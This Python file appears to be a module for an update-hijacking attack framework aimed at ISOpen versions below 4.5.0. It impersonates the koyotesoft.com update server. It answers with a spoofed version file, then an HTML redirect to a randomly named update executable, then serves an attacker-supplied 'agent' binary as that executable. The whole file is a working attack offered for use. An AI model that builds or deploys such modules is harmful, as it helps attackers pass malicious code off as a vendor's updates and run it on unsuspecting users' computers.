from modules import ModuleBase


class ISOpen(ModuleBase):
    name = 'ISOpen'
    version = '1.0'
    appver = '< 4.5.0'
    author = ['German Rodriguez < grodriguez +[AT]+ infobytesec.com >']
    description = ''
    vh = '(www.koyotesoft.com)' 
    requests = [
        {   'path': '/UpdateISOpen.php',
            'type': 'file',
            'method': '',
            'bin': 0,
            'string': '',
            'parse': 1,
            'file': './include/isopen/version',
        },
        {   'path': '/',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': '<html><script>window.location="http://www.koyotesoft.com/update<%RND1%>.exe"</script></html>',
            'parse': 1,
            'file': '',
        },
        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]
    options = {
        'version': {
            'val': "7.' + rand_num(2)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
